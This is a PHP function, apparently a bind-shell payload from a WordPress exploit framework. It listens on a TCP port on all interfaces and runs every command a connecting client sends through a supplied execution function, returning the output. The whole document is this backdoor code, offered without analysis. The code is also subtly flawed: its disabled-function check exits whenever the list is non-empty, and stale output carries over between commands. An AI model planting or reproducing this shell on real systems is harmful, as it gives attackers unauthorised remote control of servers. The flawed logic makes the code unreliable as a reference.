function startTcpSocketServer($port, $wpxf_disabled, $wpxf_exec) {
    // Check if required functions are disabled
    foreach ($wpxf_disabled as $func) {
        if (in_array($func, $wpxf_disabled)) {
            return;
        }
    }

    // Create socket
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($socket === false) {
        return;
    }

    // Bind socket to port
    if (socket_bind($socket, '0.0.0.0', $port) === false) {
        socket_close($socket);
        return;
    }

    // Listen for incoming connections
    if (socket_listen($socket, 5) === false) {
        socket_close($socket);
        return;
    }

    echo "Listening on port $port...\n";

    while (true) {
        // Accept incoming connection
        $client = socket_accept($socket);
        if ($client === false) {
            continue;
        }

        $currentDir = getcwd();

        while (true) {
            // Send current directory to client
            socket_write($client, $currentDir . '> ');

            // Read command from client
            $command = trim(socket_read($client, 1024));
            if ($command === false || $command === '') {
                break;
            }

            if (stripos($command, 'cd') === 0) {
                $dir = substr($command, 3);
                if (@chdir($dir)) {
                    $currentDir = getcwd();
                } else {
                    $output = "Error changing directory to $dir\n";
                }
            } elseif (stripos($command, 'exit') === 0 || stripos($command, 'quit') === 0) {
                break;
            } else {
                $output = call_user_func($wpxf_exec, $command);
            }

            // Send output to client
            if (!isset($output)) {
                $output = '';
            }
            socket_write($client, $output);
        }

        // Close client connection
        socket_close($client);
    }

    // Close server socket
    socket_close($socket);
}
